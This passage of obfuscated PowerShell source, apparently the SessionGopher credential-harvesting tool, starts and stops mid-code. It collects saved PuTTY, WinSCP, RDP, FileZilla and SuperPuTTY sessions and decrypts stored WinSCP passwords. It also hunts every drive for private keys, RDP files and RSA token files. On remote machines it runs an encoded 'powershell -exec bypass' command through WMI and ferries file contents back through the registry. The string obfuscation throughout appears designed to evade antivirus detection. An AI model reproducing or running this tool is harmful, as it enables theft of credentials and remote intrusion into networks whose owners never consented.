      ${O`Bj`USeR} = (&("{2}{0}{1}"-f 'appedSI','D','GetM'))
      ${SO`UrCE} = (&("{1}{2}{0}" -f'ame','Host','n')) + "\" + (&("{2}{1}{0}"-f'th','plit-Pa','S') ${Obj`Us`ER}."va`LUe" -Leaf)

      ${USE`RoB`Je`Ct} | &("{2}{1}{0}"-f'mber','-Me','Add') -MemberType ("{3}{2}{1}{0}"-f'rty','Prope','te','No') -Name ("{0}{2}{1}"-f'S','rce','ou') -Value ${O`Bju`seR}."vA`LuE"

      
      ${PUttY`p`ATH} = &("{1}{0}" -f'-Path','Join') ${h`IVe}."PSp`AtH" "\$PuTTYPathEnding"
      ${WIns`c`PPa`Th} = &("{0}{1}"-f'Jo','in-Path') ${H`ive}."P`sPaTH" "\$WinSCPPathEnding"
      ${miCrO`s`OFtrdp`p`AtH} = &("{1}{2}{0}" -f 'h','Join-P','at') ${H`iVE}."psP`A`Th" "\$RDPPathEnding"
      ${FIl`EZil`L`ApAth} = ((("{3}{1}{2}{0}"-f 'ersLdi','Ld','iUs','C:'))."rEP`la`cE"(([chAR]76+[chAR]100+[chAR]105),'\')) + (&("{2}{0}{3}{1}" -f't','ath','Spli','-P') -Leaf ${Use`R`OBjE`ct}."Source") + ((("{12}{8}{5}{0}{6}{9}{11}{14}{2}{13}{1}{7}{10}{3}{4}" -f'Ap','jZ','ZFile','ager','.xml','Z','p','s','j','D','iteman','at','C','ZillaC','aCjZRoamingCj'))-repLAcE 'CjZ',[CHAR]92)
      ${s`UpERpU`TTyP`ATH} = ((("{0}{1}{2}{3}"-f'C:{0','}U','sers{0','}'))-F  [Char]92) + (&("{0}{1}{2}{3}" -f'Sp','l','it-Pat','h') -Leaf ${User`objE`cT}."Source") + ((("{7}{8}{0}{5}{1}{2}{6}{3}{4}"-f '0}Super','{0}Sess','ions','x','ml','PuTTY','.','{0}Do','cuments{'))-F  [Char]92)

      if (&("{1}{0}{2}" -f'-','Test','Path') ${FIlE`zI`l`LApath}) {

        [xml]${F`il`eZil`LaxML} = &("{1}{3}{0}{2}" -f '-Co','Ge','ntent','t') ${f`ILEZI`lLa`PAth}
        (&("{5}{0}{4}{3}{2}{1}" -f'essFileZi','e','aFil','l','l','Proc') ${Fi`LEZILlax`ml})

      }

      if (&("{1}{2}{0}"-f'th','Tes','t-Pa') ${su`Per`P`Ut`TYpATh}) {

        [xml]${s`UpErp`UTT`yxMl} = &("{0}{1}{2}" -f 'Ge','t-Co','ntent') ${sUP`ER`PU`TtY`pAth}
        (&("{6}{3}{5}{1}{4}{2}{0}" -f'e','Y','il','uperP','F','uTT','ProcessS') ${supERpuT`T`Y`xmL})

      }

      if (&("{0}{2}{1}"-f 'Test-','th','Pa') ${MICr`osoFt`RD`ppA`Th}) {

        
        ${aL`lrdp`S`EsSions} = &("{0}{2}{1}{3}"-f 'Get','ildIt','-Ch','em') ${Micr`OsoFTr`DPpA`Th}

        (&("{0}{3}{1}{2}" -f'Pro','Loca','l','cessRDP') ${ALlrD`p`SesSio`NS})

      } 

      if (&("{2}{1}{0}"-f'st-Path','e','T') ${WI`N`sCP`PATH}) {

        
        ${aLlw`i`N`S`CpSEssiOns} = &("{0}{2}{1}" -f 'Get-Chil','Item','d') ${w`inSC`ppaTh}

        (&("{2}{3}{4}{0}{5}{1}"-f 'ce','SCPLocal','P','r','o','ssWin') ${Allw`INScp`s`ES`SioNs})

      } 
      
      if (&("{1}{2}{0}" -f'th','T','est-Pa') ${puTt`Yp`Ath}) {

        
        ${AL`LpUttys`eSSiO`Ns} = &("{3}{1}{2}{0}" -f'dItem','et','-Chil','G') ${PUt`TYp`AtH}

        (&("{1}{0}{2}{3}" -f 'TT','ProcessPu','Y','Local') ${aLLpUt`TySE`s`sioNS})

      } 

    } 

    
    if (${th`ORO`Ugh}) {

      
      ${PPk`EXt`eNSi`Onf`iles`InOd`Es} = &("{3}{0}{2}{1}"-f'ew-O','ect','bj','N') ("{4}{3}{1}{5}{0}{2}"-f'ons.ArrayLi','.C','st','ystem','S','ollecti')
      ${rdPeX`TEnSioNfiLes`ino`D`ES} = &("{2}{1}{0}" -f'-Object','w','Ne') ("{0}{4}{2}{1}{5}{3}" -f 'System.C','ns','io','ayList','ollect','.Arr')
      ${SdT`iDexten`SiONf`IleSINO`d`eS} = &("{0}{2}{1}" -f'New-Obje','t','c') ("{4}{0}{6}{3}{5}{2}{1}"-f '.Col','t','.ArrayLis','io','System','ns','lect')

      
      ${A`Ll`drIV`es} = &("{2}{3}{1}{0}"-f'rive','SD','Get-','P')

      (&("{4}{6}{1}{5}{3}{2}{0}" -f'cal','oc','hLo','sThoroug','P','es','r') ${aL`lDR`iveS})
      
      (&("{2}{0}{3}{1}" -f 'ocessPP','e','Pr','KFil') ${pPKExtE`N`Sio`NfILesi`NOD`ES})
      (&("{4}{0}{1}{2}{3}"-f 'oces','sRDPF','il','e','Pr') ${rDP`EXtenS`io`NFiLE`Sin`odES})
      (&("{2}{0}{1}" -f 'esssdt','idFile','Proc') ${SDTi`DextE`Nsi`ONFILeS`i`No`DEs})

    } 

  } 

} 








function GETm`APpEDS`Id {

  
  if (${Il} -or ${ta`RGEt} -or ${a`LldOM`AiN}) {
    
    ${Si`DPATh} = (('SOF'+'TWARE{'+'0}'+'Microsoft{0}Wi'+'n'+'do'+'ws ')-f [ChaR]92+"NT\CurrentVersion\ProfileList\$SID")
    ${VA`L`UE} = ("{0}{1}{3}{4}{2}"-f 'Pro','f','ImagePath','il','e')

    return (&("{1}{4}{0}{3}{2}" -f'-','Invok','miMethod','W','e') -ComputerName ${REm`oTecompu`Ter} -Class ("{2}{0}{1}" -f'tdRegPro','v','S') -Name ("{2}{0}{1}"-f't','ringValue','GetS') -ArgumentList ${H`kLM},${S`I`DpATH},${V`ALUE} @optionalCreds)."Sv`Alue"
  
  } else {
    
    ${S`iD} = (&("{1}{0}{2}{3}"-f'lit','Sp','-Pat','h') ${HI`VE}."n`Ame" -Leaf)
    ${ob`jsiD} = &("{1}{0}{2}"-f 'e','New-Obj','ct') ("{0}{4}{12}{11}{5}{1}{2}{7}{9}{6}{8}{10}{3}" -f 'System','P','rin','er','.','.','ecur','ci','ityIdenti','pal.S','fi','ty','Securi')("$SID")
    return ${oB`JS`iD}."TR`ANsla`TE"( [System.Security.Principal.NTAccount])
  }

}

function dO`wnloadaNDEXtra`cTF`RO`MremOt`eRegiSTRy(${F`iLe}) {
  
  
  ${F`UllREG`isTRy`p`A`TH} = ((("{7}{5}{8}{3}{9}{2}{1}{0}{6}{4}" -f '}Microsoft','0','e{','ftwa','0}DRM','{','{','HKLM:','0}So','r'))  -F [chAr]92)
  ${regiSt`R`yD`OWn`N`AMe} = ("{0}{1}" -f'Rea','dMe')
  ${REG`pA`Th} = ((("{2}{0}{6}{4}{7}{1}{3}{5}"-f 'WAREE','o','SOFT','ftEt','icr','8DRM','t8M','os'))."RE`P`lAcE"(([cHAr]69+[cHAr]116+[cHAr]56),[StriNg][cHAr]92))
          
  
  &("{0}{4}{2}{1}{3}"-f 'W','s','-Verbo','e','rite') ("{9}{4}{11}{6}{8}{0}{2}{3}{1}{5}{10}{12}{7}" -f'nd w','ing on r','ri','t','ading remote','emo','e','gistry',' a','Re','te',' fil',' re')
  ${reMO`TE_C`oM`M`ANd} = (('{0}f'+'ct ')-f  [CHAr]36+'= '+'Get-Co'+'nten'+'t'+' '+'-'+'Encod'+'ing '+'byt'+'e '+'-P'+'a'+'th '+('t6'+'8'+'t68')."RepL`A`CE"('t68',[sTring][cHaR]39)) + "$File" + ((('eCD'+'eCD;'+' ')  -cReplaCe([chaR]101+[chaR]67+[chaR]68),[chaR]39)+('{0}f'+'c'+'t'+'enc ') -F [chAr]36+'= '+('[System.Convert'+']::To'+'Ba'+'s'+'e64Stri'+'n'+'g'+'({0'+'}fct)'+';'+' ')-F [CHaR]36+'New'+'-'+'I'+'t'+'emProp'+'erty '+'-'+'Path '+'') + "'$fullregistrypath'" + ("{0}{1}"-f' -Na','me ') + "'$registrydownname'" + (' '+'-'+'V'+'alue '+('A'+'S8f'+'cten'+'c ').("{0}{1}"-f'R','eplACe').Invoke('AS8','$')+'-Property'+'T'+'ype '+'Str'+'i'+'ng '+'-For'+'ce')
  ${REmoTE`_`cOMmA`ND} = ((("{0}{2}{4}{5}{1}{3}"-f 'powershel','xec bypass -','l','c a9o',' -no','p -e'))-cRePlaCe  'a9o',[char]34) + ${reM`OtE_C`O`m`mAnd} + '"'

  ${nu`Ll} = &("{2}{0}{1}" -f'-WmiMet','hod','Invoke') -class ("{0}{2}{1}"-f 'win','ocess','32_pr') -Name ("{0}{1}"-f'Crea','te') -Argumentlist ${r`eM`OTE_CO`MmANd} -ComputerName ${ReMo`Te`CoMPutER} @optionalCreds

  
  &("{0}{3}{2}{1}"-f'Sta','leep','t-S','r') -s 15

  ${r`EMOTe_`REg} = ""

  
  ${r`eMotE`_Reg} = &("{4}{1}{3}{2}{0}{5}"-f'ho','ke-','miMet','W','Invo','d') -Namespace ((("{1}{0}{2}{3}"-f'ootk9ide','r','fau','lt'))-REplacE'k9i',[chAr]92) -Class ("{1}{0}{2}"-f'Reg','Std','Prov') -Name ("{0}{4}{2}{3}{1}"-f 'G','Value','tStrin','g','e') -ArgumentList ${h`kLM}, ${r`eGP`AtH}, ${r`egi`stRyd`OwNna`ME} -Computer ${re`m`o`TE`COmpUter} @optionalCreds
  
  ${Dec`OdeD} =  $wFsX02::("{4}{3}{2}{1}{0}" -f 'ing','e64Str','s','romBa','F').Invoke(${R`e`mOTe_`Reg}."s`VAL`UE")
  ${uTf8`De`C`oDEd} =   ( iTEM ("vAR"+"ia"+"b"+"lE:1Ef")).VaLUe::"UT`F8"."GetS`TR`iNg"(${d`Ecoded}) 
    
  
  ${NU`lL} = &("{4}{3}{0}{2}{1}" -f 'k','Method','e-Wmi','o','Inv') -Namespace ((("{0}{1}{2}"-f 'roo','tXPWdef','ault'))."re`PLAcE"(([ChAr]88+[ChAr]80+[ChAr]87),'\')) -Class ("{1}{2}{0}"-f 'rov','S','tdRegP') -Name ("{2}{0}{1}" -f't','eValue','Dele') -Argumentlist ${RE`Ghi`Ve}, ${rEGP`A`Th}, ${ReGI`sT`RyD`OWNN`AMe} -ComputerName ${RE`m`OTE`coMPUT`er} @optionalCreds
  
  return ${utf8DE`co`dED}

}







function pr`OCESSt`hor`oughL`oCal(${a`LldR`i`VES}) {
  
  foreach (${dR`IvE} in ${A`LL`drIVes}) {
    
    if (${dri`Ve}."PRoV`ID`er"."n`AMe" -eq ("{2}{0}{1}"-f'leSys','tem','Fi')) {
      ${D`IRs} = &("{2}{0}{3}{1}"-f '-Ch','tem','Get','ildI') ${dri`VE}."R`OOt" -Recurse -ErrorAction ("{0}{2}{1}{3}{4}" -f 'S','t','ilentlyCon','inu','e')
      foreach (${D`ir} in ${d`IRs}) {
        Switch (${d`IR}."EX`T`ENSioN") {
          ("{1}{0}" -f'ppk','.') {[void]${Ppk`ExTe`NsI`ON`F`ilEsI`NoDeS}.("{0}{1}"-f'A','dd').Invoke(${d`ir})}
          ("{0}{1}"-f'.rd','p') {[void]${RdpexT`Ensi`ONFI`leSI`NO`d`Es}.("{1}{0}"-f'd','Ad').Invoke(${d`ir})}
          ("{1}{0}"-f'sdtid','.') {[void]${s`DTId`ExtENSIonFIlEsI`NoD`Es}.("{1}{0}" -f 'd','Ad').Invoke(${d`iR})}
        }
      }
    }
  }

}

function PR`OCeSS`ThO`ROUgHre`moTe(${F`iLEpAT`h`S`FOund}) {

  foreach (${Fi`l`ePAtH} in ${filepAth`s`F`oUnd}) {
      
      ${t`h`Orou`ghobje`ct} = "" | &("{0}{1}{2}"-f 'Se','l','ect-Object') -Property ("{0}{1}"-f 'So','urce'),("{1}{0}"-f 'ath','P')
      ${T`hOROu`GHO`BJE`ct}."sO`U`RCe" = ${rE`mOteCoM`pUTeR}

      ${Ex`TEnsi`On} =   $BOp0::("{2}{0}{1}"-f'tensio','n','GetEx').Invoke(${fi`lepA`Th}."NA`me")

      if (${ex`T`e`Nsion} -eq ("{1}{0}"-f 'pk','.p')) {
        ${THORo`Ug`hobJECT}."PA`TH" = ${FILePA`Th}."n`AME"
        [void]${a`R`RA`Yofp`PKFileS}.("{1}{0}"-f 'd','Ad').Invoke(${t`HOroU`ghOB`JeCT})
      } elseif (${EX`T`e`NsiON} -eq ("{0}{1}"-f'.rd','p')) {
        ${ThOROuGhoB`j`eCt}."P`ATh" = ${fi`l`EPATH}."nA`ME"
        [void]${aR`RAyo`F`RDpfil`Es}.("{1}{0}"-f 'd','Ad').Invoke(${tHOroug`Ho`B`J`eCT})
      } elseif (${eXT`eNsI`oN} -eq ("{1}{0}" -f 'dtid','.s')) {
        ${THO`R`o`UG`hoBJect}."p`ATH" = ${F`Ile`patH}."n`Ame"
        [void]${aRrA`yOFS`DtI`DfILEs}.("{0}{1}" -f 'A','dd').Invoke(${ThoRougHo`Bje`cT})
      }

  }

  if (${ArraY`OfPpk`FI`L`ES}."Co`Unt" -gt 0) {

    ${u`s`er`ObJeCT} | &("{2}{1}{0}" -f'mber','dd-Me','A') -MemberType ("{1}{0}{2}"-f 'ePrope','Not','rty') -Name ("{2}{0}{1}"-f'K F','iles','PP') -Value ${A`R`RA`Yof`RDPFILES}

    if (${o}) {
      ${Ar`RayOF`p`pKF`IlEs} | &("{1}{0}{2}" -f 'C','Export-','SV') -Append -Path (${o`UTPuTD`iRe`Ctory} + ((("{4}{2}{3}{5}{1}{0}" -f 'csv',' Files.','Pu','TT','D9G','Y ppk'))."rePla`cE"('D9G',[StriNg][ChaR]92))) -NoTypeInformation
    } else {
      &("{2}{0}{1}{3}" -f'u','t','Write-O','put') ("{3}{2}{4}{5}{0}{1}" -f'es (.p','pk)','Y Private Key','PuTT',' F','il')
      ${aR`RaY`oF`P`PKfiLes} | &("{1}{3}{0}{2}"-f '-Lis','Fo','t','rmat') | &("{3}{0}{1}{2}"-f't-St','r','ing','Ou')
    }
  }

  if (${ArRAyO`FR`D`PFiLEs}."CO`UNT" -gt 0) {

    ${UsERO`Bje`ct} | &("{0}{1}{2}" -f 'Ad','d-Memb','er') -MemberType ("{3}{1}{0}{2}"-f 'per','tePro','ty','No') -Name ("{2}{0}{1}" -f'DP File','s','R') -Value ${ArRa`YOFR`DPfi`Les}

    if (${o}) {
      ${aRRAyOf`R`DPFi`LES} | &("{1}{3}{0}{2}"-f 't-','Expo','CSV','r') -Append -Path (${O`UTP`Ut`DiREct`OrY} + ((("{2}{5}{3}{0}{1}{6}{4}{7}"-f 't ','rd','Xj','of','e','YMicros','p Fil','s.csv'))."rE`pLacE"(([chaR]88+[chaR]106+[chaR]89),'\'))) -NoTypeInformation
    } else {
      &("{1}{2}{0}{3}"-f 'e-Outpu','Wri','t','t') ("{5}{2}{8}{6}{10}{7}{4}{9}{3}{0}{1}"-f' (.r','dp)','i','n Files','onne','M','soft','P C','cro','ctio',' RD')
      ${AR`RAyoF`Rd`PFiL`es} | &("{1}{3}{0}{2}"-f't-','F','List','orma') | &("{0}{1}{2}"-f 'Out-','Str','ing')
    }
  }
  if (${A`RrAyo`FSdt`IdfI`LeS}."cOU`Nt" -gt 0) {

    ${USE`RO`BjEcT} | &("{2}{0}{1}" -f '-Me','mber','Add') -MemberType ("{1}{0}{2}{3}" -f 'rope','NoteP','rt','y') -Name ("{0}{3}{2}{1}" -f 's','les','tid Fi','d') -Value ${aRRAyOFs`dTI`dF`ILeS}

    if (${o}) {
      ${ArrAy`of`s`DtiDfilEs} | &("{2}{1}{0}"-f 'CSV','ort-','Exp') -Append -Path (${oU`T`PutdiREcTo`RY} + ((("{5}{2}{4}{1}{0}{3}" -f 'iles.','id F','A ','csv','sdt','{0}RS')) -f[Char]92)) -NoTypeInformation
    } else {
      &("{2}{1}{0}"-f 'utput','e-O','Writ') (("{2}{3}{1}{0}"-f')','tid','RSA Token','s (sd'))
      ${arrAy`OF`Sdt`i`dFILeS} | &("{1}{2}{0}" -f 't-List','F','orma') | &("{1}{0}{2}" -f '-S','Out','tring')
    }

  }

} 

function p`R`o`CESsPuttYlOCaL(${a`lL`pUt`Tys`essiOns}) {
  
  
  foreach(${S`esS`iOn} in ${AlLPut`T`y`Se`SsIONS}) {

    ${PutT`YSEsS`IONobJ`ECt} = "" | &("{1}{0}{3}{2}" -f'-Obj','Select','t','ec') -Property ("{0}{1}"-f'Sour','ce'),("{0}{1}" -f'Ses','sion'),("{2}{0}{1}" -f 'ostnam','e','H')

    ${pU`T`TY`SEssiON`OBjE`Ct}."sOu`R`CE" = ${S`o`Urce}
    ${puTtYSE`ss`iOnObJe`ct}."SEssI`oN" = (&("{1}{0}{2}" -f 'plit-Pa','S','th') ${sEssi`ON} -Leaf)
    ${pu`TT`YSeSsIono`BJE`CT}."h`OSTNAMe" = ((&("{1}{0}{2}{3}" -f 'P','Get-Item','ro','perty') -Path (((("{0}{1}{4}{3}{2}{5}"-f 'Micr','osoft.Pow','QRegi','rShell.Coreks','e','stry::'))."r`EpL`AcE"(([cHAr]107+[cHAr]115+[cHAr]81),'\')) + ${S`ESS`Ion}) -Name ("{0}{2}{1}" -f 'Host','me','na') -ErrorAction ("{1}{0}{2}" -f'len','Si','tlyContinue'))."h`OstnamE")

    
    [void]${arRaYOFpU`TtySEs`SI`ons}.("{1}{0}" -f 'dd','A').Invoke(${pU`Ttys`E`ssio`NOBjE`Ct})

  }

  if (${O}) {
    ${Ar`Ra`y`OFpU`TTYSe`sSIONs} | &("{1}{0}{2}" -f 'port-CS','Ex','V') -Append -Path (${output`dirEC`T`orY} + ((("{2}{1}{0}"-f '.csv','Y','kKlPuTT'))-RepLACE  ([ChAR]107+[ChAR]75+[ChAR]108),[ChAR]92)) -NoTypeInformation
  } else {
    &("{0}{2}{1}" -f'Write-Out','t','pu') ("{1}{0}{3}{2}" -f' Se','PuTTY','s','ssion')
    ${aR`R`AyOfpu`TTy`seS`sIonS} | &("{2}{0}{1}" -f '-L','ist','Format') | &("{2}{0}{1}" -f 'Stri','ng','Out-')
  }

  
  ${U`s`E`RobJEcT} | &("{0}{3}{1}{2}"-f 'A','e','r','dd-Memb') -MemberType ("{0}{1}{3}{2}" -f'No','t','erty','eProp') -Name ("{0}{1}{2}{3}" -f'Pu','TTY Sess','i','ons') -Value ${A`RrA`yOFpU`T`TySE`SSIOns}

} 

function p`RocEssRd`P`L`ocaL(${AlLRdPs`eS`s`iOnS}) {

  
  foreach(${Se`SSiOn} in ${alL`Rdpse`s`sionS}) {

    ${PATHTorDP`s`E`SS`ion} = ((("{5}{2}{0}{6}{1}{4}{3}" -f 'Pow','hell.Core{0','icrosoft.',':','}Registry:','M','erS'))  -F  [char]92) + ${se`Ss`ION}

    ${MI`cr`O`So`FtRDP`Ses`SiO`NObJect} = "" | &("{3}{1}{0}{2}"-f'O','ct-','bject','Sele') -Property ("{1}{0}"-f 'e','Sourc'),("{0}{1}{2}"-f'H','os','tname'),("{0}{1}" -f'Userna','me')

    ${mic`ROsOfTRDP`SeSSioNo`B`JEct}."s`ouRce" = ${sOur`cE}
    ${MI`cR`osoFTRDpsessi`o`N`oBjECt}."HoSt`N`AmE" = (&("{1}{2}{0}"-f'-Path','Spli','t') ${se`s`sion} -Leaf)
    ${MI`CRosoFtrdPs`esSIOn`Ob`J`Ect}."U`SERnamE" = ((&("{3}{0}{2}{1}" -f'-Item','roperty','P','Get') -Path ${p`At`HtorD`ps`e`SsiON} -Name ("{0}{1}{2}"-f 'Use','rnameH','int') -ErrorAction ("{2}{1}{0}" -f'nue','ti','SilentlyCon'))."u`sE`RNaMEhInT")

    
    [void]${AR`R`AYoFRdpSE`s`si`Ons}.("{0}{1}" -f 'A','dd').Invoke(${mICrOsOfTr`dpS`eSSI`O`NobjE`ct})

  } 

  if (${O}) {
    ${a`RRAYO`FRD`pseSsIOns} | &("{3}{0}{1}{2}" -f 'xport-','C','SV','E') -Append -Path (${OUtput`DI`Re`c`ToRY} + ((("{2}{1}{0}" -f 'P.csv','D','V39R'))-CRePlAcE'V39',[cHaR]92)) -NoTypeInformation
  } else {
    &("{0}{2}{1}" -f 'Wr','t','ite-Outpu') ("{5}{8}{6}{4}{7}{9}{1}{2}{3}{10}{0}"-f'Sessions','e ','Desktop (R','DP','f','M','croso','t R','i','emot',') ')
    ${arra`YOf`RDPs`e`SSiO`Ns} | &("{0}{1}{2}"-f'Fo','rmat-Lis','t') | &("{0}{1}{2}"-f'Out-S','tr','ing')
  }

  
  ${u`sErOB`jeCT} | &("{0}{2}{1}"-f 'Add-','ber','Mem') -MemberType ("{0}{2}{1}{3}"-f'N','ePrope','ot','rty') -Name ("{0}{3}{2}{1}"-f'R','ions','ess','DP S') -Value ${aRR`AYo`FrDPS`ESS`ionS}

} 

function pRoCE`sSWIN`ScPL`oCAl(${al`lWIN`ScPSeSS`IOnS}) {
  
  
  foreach(${Se`SsIOn} in ${aLlW`INSC`psESsI`ons}) {

    ${paT`Ht`O`WIn`scpS`eSS`IoN} = ((("{0}{2}{1}{8}{4}{9}{6}{5}{7}{3}" -f 'Microsof','erShe','t.Pow','::','.Cor','i','IGXReg','stry','ll','e'))-creplAce  'IGX',[chAr]92) + ${Se`sSi`oN}

    ${W`InScp`ses`s`iONOBjE`ct} = "" | &("{0}{4}{2}{3}{1}" -f 'S','ect','t-','Obj','elec') -Property ("{0}{2}{1}" -f 'So','ce','ur'),("{0}{1}" -f 'Sess','ion'),("{0}{1}" -f'Host','name'),("{1}{2}{0}"-f'e','User','nam'),("{2}{0}{1}"-f 'or','d','Passw')

    ${Wi`NSc`PseSSION`ObJe`Ct}."S`Ou`Rce" = ${soUr`Ce}
    ${wIn`ScpSesSiOno`B`JeCT}."se`SsI`On" = (&("{1}{2}{3}{0}"-f'Path','Spl','it','-') ${SeS`s`iOn} -Leaf)
    ${W`iN`sCPSEss`IONo`BJEcT}."HoS`TNA`ME" = ((&("{1}{0}{2}{3}" -f'em','Get-It','Pr','operty') -Path ${paTHt`Owi`NSC`psESSIOn} -Name ("{0}{1}{2}"-f 'Hostna','m','e') -ErrorAction ("{0}{2}{1}{3}{4}" -f'S','n','ile','tlyContinu','e'))."H`O`sTNaME")
    ${winSCp`s`es`SION`ObJECT}."UsErn`A`mE" = ((&("{3}{0}{2}{1}{4}"-f't-','emPr','It','Ge','operty') -Path ${pAT`HT`OWInscPs`essI`oN} -Name ("{2}{1}{0}" -f'ame','ern','Us') -ErrorAction ("{0}{3}{2}{1}" -f 'Sil','ntinue','o','entlyC'))."U`S`ernAME")
    ${wI`NSC`P`SEssio`NObJ`EcT}."pas`sWo`Rd" = ((&("{2}{3}{1}{0}{4}" -f 'r','t-ItemP','G','e','operty') -Path ${PA`TH`ToWiNS`Cp`SeS`S`IOn} -Name ("{1}{0}"-f 'word','Pass') -ErrorAction ("{2}{0}{3}{1}{4}"-f'entlyC','ti','Sil','on','nue'))."pA`sS`WORD")

    if (${WinScPsesS`IONoB`J`ECT}."PAS`s`wOrD") {
      ${MaS`Terp`AS`suSEd} = ((&("{3}{0}{2}{1}"-f 'm','operty','Pr','Get-Ite') -Path (&("{1}{2}{0}" -f 'in-Path','J','o') ${HI`Ve}."PSp`Ath" ((("{10}{2}{6}{8}{7}{0}{5}{4}{9}{3}{1}"-f 'rtin PrikrylW92WinS','rationW92Security','FTWAR','igu','2Co','CP 2W9','EW9','Ma','2','nf','SO')) -REpLacE([CHAr]87+[CHAr]57+[CHAr]50),[CHAr]92)) -Name ("{2}{3}{1}{0}" -f'rd','asswo','Us','eMasterP') -ErrorAction ("{4}{0}{2}{3}{1}" -f'ntlyC','e','on','tinu','Sile'))."USEMa`STe`Rpa`SSwo`RD")

      
      if (!${mAsTerp`ASSus`ED}) {
          ${WinsCPS`E`ssioNoBJ`ecT}."pa`sSwo`RD" = (&("{1}{5}{3}{0}{2}{4}"-f'Pass','Dec','wor','inSCP','d','ryptW') ${Wi`N`SCpsE`SSIONOBjEcT}."HOsT`NaME" ${WinSCpS`eS`SI`onobJect}."USEr`NA`ME" ${wi`N`ScPsESs`IoNOBJe`cT}."pAs`sWoRD")
      
      } else {
          ${win`scP`sESSI`onObjE`Ct}."pas`S`wORd" = ("{6}{0}{7}{4}{3}{8}{2}{9}{5}{13}{14}{12}{10}{11}{1}" -f'in sess','ecovery','t m','n, ','o','sswor','Saved ','i','bu','aster pa','intext ','r','pla','d ','prevents ')
      }
    }

    
    [void]${arraYO`FwiN`sC`PSE`s`SiONS}.("{0}{1}" -f'A','dd').Invoke(${wIns`CPs`esS`i`OnObJE`ct})

  } 

  if (${o}) {
    ${arRAYoF`Wi`Nscp`seSsIoNS} | &("{1}{2}{0}"-f 'CSV','Expor','t-') -Append -Path (${o`U`TpU`TDIrE`cTOry} + ((("{0}{2}{1}{3}"-f'{','nSCP.cs','0}Wi','v'))-f [cHaR]92)) -NoTypeInformation
  } else {
    &("{1}{0}{2}" -f'rite-Out','W','put') ("{0}{2}{1}{3}" -f'WinSCP','es',' S','sions')
    ${arr`AY`O`FWinSC`psE`s`sions} | &("{0}{2}{1}"-f 'For','st','mat-Li') | &("{1}{2}{0}"-f'ing','Out-St','r')
  }

  
  ${uSERo`B`J`ect} | &("{0}{1}{2}" -f 'Add-','Me','mber') -MemberType ("{0}{1}{2}"-f 'NotePro','pe','rty') -Name ("{1}{2}{3}{0}{4}"-f 'on','Win','S','CP Sessi','s') -Value ${A`Rra`YofwINSCpS`eSs`ioNS}

} 

function ProceSs`s`D`TIdFILE(${sdTidext`eNsiOn`F`I`LeSI`NoDes}) {

  foreach (${PA`TH} in ${S`dt`i`deXTensi`oNF`ile`siNODeS}."VE`RSi`ONInfo"."fiLEn`AMe") {

    ${SDTIDfi`L`E`OBJEct} = "" | &("{4}{0}{1}{3}{2}"-f'el','ect-O','ct','bje','S') -Property ("{0}{1}" -f 'Sourc','e'),("{0}{1}"-f 'Pa','th')

    ${sdTid`File`oB`j`eCt}."Source" = ${SOu`RcE}
    ${S`dT`IdfiLeoBJ`EcT}."Path" = ${P`AtH}

    [void]${a`R`RAYO`FS`dtidFIles}.("{1}{0}"-f 'd','Ad').Invoke(${sDtId`Fileo`BjE`ct})

  }

  if (${A`Rray`O`FsdTi`dFI`lES}."CO`UNT" -gt 0) {

    ${us`e`ROBJEct} | &("{0}{2}{1}"-f 'Add-Me','er','mb') -MemberType ("{2}{0}{1}" -f'o','teProperty','N') -Name ("{3}{1}{0}{2}" -f'e','il','s','sdtid F') -Value ${Ar`RA`Yofsdti`dFIL`ES}

    if (${o}) {
      ${A`RrAYo`FSDti`DFIl`ES} | &("{1}{2}{0}"-f'ect','Select-','Obj') ('*') | &("{2}{1}{0}"-f 'V','t-CS','Expor') -Append -Path (${oUtputdiR`e`c`ToRY} + ((("{4}{1}{2}{3}{0}" -f 'sv',' sdtid ','Files','.c','{0}RSA')) -f  [CHAr]92)) -NoTypeInformation
    } else {
      &("{1}{3}{2}{0}"-f'tput','W','e-Ou','rit') (("{3}{1}{2}{4}{0}" -f'd)','A T','ok','RS','ens (sdti'))
      ${ar`RA`y`ofsdT`I`dfIlEs} | &("{0}{1}{2}" -f 'Sel','ect-Obj','ect') ('*') | &("{2}{1}{0}{3}" -f 't-','a','Form','List') | &("{0}{3}{2}{1}" -f 'Ou','ng','i','t-Str')
    }

  }

} 

function pR`oces`s`RdpFi`Le(${rDP`eXTeNS`Io`N`FIlesINoDeS}) {
  
  
  foreach (${P`AtH} in ${rdpE`XTe`NSION`FiLes`I`NO`DeS}."vERsIonI`N`FO"."fi`LeN`Ame") {
    
    ${RdpfI`l`E`oBJeCt} = "" | &("{0}{1}{2}" -f'Sele','ct-Objec','t') -Property ("{0}{1}"-f'Sour','ce'),("{1}{0}" -f 'h','Pat'),("{2}{0}{1}" -f't','name','Hos'),("{0}{1}"-f 'Gat','eway'),("{6}{5}{1}{2}{4}{3}{0}" -f'dentials','pts ','fo','e','r Cr','om','Pr'),("{1}{0}{2}{4}{3}"-f'nistrative Se','Admi','s','n','sio')

    ${rDP`FIleo`B`ject}."Source" = (&("{1}{2}{0}" -f'e','Ho','stnam'))

    
    ${R`Dp`Fi`LeOB`JeCT}."Path" = ${Pa`Th} 
    ${rd`PfI`le`oBJect}."Hostname" = try { (&("{1}{0}{2}" -f'elect-','S','String') -Path ${P`ATh} -Pattern (("{1}{4}{5}{2}{3}{0}" -f '.*)','f','[a-z',']:(','ull ','address:')))."MA`TCHES"."GRo`U`ps"[1]."vaL`UE" } catch {}
    ${rdpF`IleO`B`Je`ct}."Gateway" = try { (&("{3}{2}{4}{1}{0}" -f 'g','in','-S','Select','tr') -Path ${p`AtH} -Pattern ("{0}{7}{4}{5}{1}{3}{6}{2}"-f'g','tna',':(.*)','me:[a-','yho','s','z]','atewa'))."ma`T`ches"."Gro`UPs"[1]."V`AluE" } catch {}
    ${RDpFi`leo`B`jEct}."Administrative Session" = try { (&("{0}{1}{3}{4}{2}" -f 'S','e','g','l','ect-Strin') -Path ${p`Ath} -Pattern (("{5}{0}{3}{2}{6}{1}{7}{4}" -f 'dministrative se','z',':[a','ssion','*)','a','-',']:(.')))."M`AtCH`eS"."gr`o`UPs"[1]."Va`LUe" } catch {}
    ${rDP`F`iLeoBJeCT}."Prompts for Credentials" = try { (&("{2}{1}{4}{0}{3}"-f 'rin','ect','Sel','g','-St') -Path ${P`ATh} -Pattern ("{3}{1}{0}{5}{2}{7}{8}{6}{4}{9}" -f 'crede','or ','tials:','prompt f','.*','n',']:(','[','a-z',')'))."m`AT`Ches"."gRo`UPS"[1]."Va`LUe" } catch {}

    if (!${Rdpf`ILEO`Bje`ct}."Administrative Session" -or !${RDp`F`IL`E`oBjEct}."Administrative Session" -eq 0) {
